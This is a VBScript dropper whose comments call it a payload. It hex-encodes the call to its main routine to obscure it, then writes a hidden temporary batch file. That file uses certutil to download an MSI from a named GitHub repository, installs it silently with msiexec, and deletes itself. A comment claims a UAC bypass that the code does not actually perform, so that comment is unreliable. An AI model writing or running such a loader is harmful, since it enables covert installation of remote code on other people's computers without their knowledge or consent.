' Hex-decoder function  
Function Decode(s)  
    Dim out, i, hexVal  
    For i = 1 To Len(s) Step 2  
        hexVal = "&H" & Mid(s, i, 2)  
        out = out & Chr(hexVal)  
    Next  
    Decode = out  
End Function  

' Main payload execution  
Sub RunPayload()  
    On Error Resume Next  
    Dim fso, batFile, wsh  
    Set fso = CreateObject("Scripting.FileSystemObject")  
    Set wsh = CreateObject("WScript.Shell")  
    
    ' Generate random temp filename  
    batFile = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".bat"  
    
    ' Write the silent MSI installer command  
    With fso.CreateTextFile(batFile, True)  
        .WriteLine "certutil -urlcache -split -f https://github.com/lordcrowleyco-alt/new/raw/refs/heads/main/setup.msi %temp%\setup.msi"  
        .WriteLine "msiexec /i ""%temp%\setup.msi"" /qn /norestart"  
        .WriteLine "timeout 1 & del """ & batFile & """"  
        .Close  
    End With  
    
    ' Execute with UAC bypass  
    wsh.Run "cmd /c """ & batFile & """", 0, True  
End Sub  

' Execute the payload  
Execute Decode("52756E5061796C6F61642829")